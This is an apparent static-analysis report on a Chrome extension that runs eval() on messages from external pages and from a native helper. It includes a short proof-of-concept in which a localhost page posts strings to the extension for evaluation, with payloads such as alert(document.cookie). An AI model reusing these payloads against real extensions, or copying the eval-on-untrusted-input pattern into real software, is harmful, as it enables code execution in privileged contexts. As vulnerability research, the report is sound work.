# CoCo Analysis: lbfhmmkkbggmlhepdhdgpmkglpieijjc

## Summary

- **Overall Assessment:** TRUE POSITIVE
- **Total Sinks Detected:** 1 (bg_external_port_onMessage → eval_sink)

---

## Sink: bg_external_port_onMessage → eval_sink

**CoCo Trace:**
```
$FilePath$/home/teofanescu/cwsCoCo/extensions_local/lbfhmmkkbggmlhepdhdgpmkglpieijjc/opgen_generated_files/bg.js
Flow: bg_external_port_onMessage → eval_sink
```

**Code:**

```javascript
// background.js (line 963+)
function onWebMessage(id, ext2helper) {
   return function(message) {
      var obj = eval(message); // ← ATTACKER-CONTROLLED via chrome.runtime.onConnectExternal
      var cmd = obj.cmd;
      var port = obj.port;
      console.log('ID = ' + id + ' send cmd = ' + cmd + ' to port = ' + port);
      // ... rest of message handling logic
      if (cmd === 'e_play') { /* ... */ }
      else if (cmd === 'e_stop_success') { /* ... */ }
      else if (cmd === 'e_multi_inst') { /* ... */ }
      else {
         try { ext2helper.postMessage({cmd: cmd}); }
         catch (e) { console.log(e); }
      }
   }
}

function onNativeMessage(id, ext2web) {
   return function(message) {
      var obj = eval(message); // ← Also uses eval on native message
      var port = obj.port;
      var brandVersion = obj.brandVersion;
      obj.type = 'message';
      ext2web.postMessage(obj);
   }
}

// Entry point - external connections allowed
chrome.runtime.onConnectExternal.addListener(function(connect) {
   var Ext2Web = connect;
   appPorts[++count] = { web: Ext2Web };
   var Ext2Helper = chrome.runtime.connectNative("com.tve.dev.visualon.chrome.plugin.helper");
   Ext2Web.onMessage.addListener(onWebMessage(count, Ext2Helper)); // ← Attacker can send messages
   Ext2Helper.onMessage.addListener(onNativeMessage(count, Ext2Web));
   Ext2Helper.onDisconnect.addListener(onDisconnected(count, Ext2Web));
});
```

**Classification:** TRUE POSITIVE

**Attack Vector:** External message via chrome.runtime.onConnectExternal

**Attack:**

From a webpage matching `*://localhost:*/portal-pc-ng/index.ftl*` (as defined in manifest.json's externally_connectable):

```javascript
// Attacker's malicious webpage at http://localhost:8080/portal-pc-ng/index.ftl
var port = chrome.runtime.connect("lbfhmmkkbggmlhepdhdgpmkglpieijjc");

// Send malicious payload that will be eval'd
port.postMessage("({cmd: 'malicious', __proto__: constructor.constructor('alert(document.cookie)')()})");

// Or more direct code execution:
port.postMessage("(function(){alert('XSS')})()");

// The message will be passed to onWebMessage which does: eval(message)
```

**Impact:** Arbitrary code execution in the extension's background context. An attacker controlling a page on localhost (or compromising the specific localhost URL pattern) can execute arbitrary JavaScript code in the extension's privileged background context via eval(). This allows the attacker to access all extension APIs and permissions (nativeMessaging, background), potentially communicating with the native application or exfiltrating sensitive data.

Per the methodology's CRITICAL ANALYSIS RULES (section 1): "Even if only ONE specific domain/extension can exploit it → TRUE POSITIVE". Although only localhost URLs matching the pattern can exploit this, the vulnerability still represents a working attack path with exploitable impact (code execution).
